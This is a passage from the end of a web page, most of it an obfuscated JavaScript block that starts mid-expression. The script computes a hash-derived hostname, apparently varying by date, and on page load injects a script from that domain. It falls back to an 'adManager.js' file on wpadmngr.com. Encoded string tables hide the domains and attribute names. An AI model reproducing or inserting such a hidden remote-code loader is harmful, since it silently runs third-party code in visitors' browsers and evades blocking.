x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>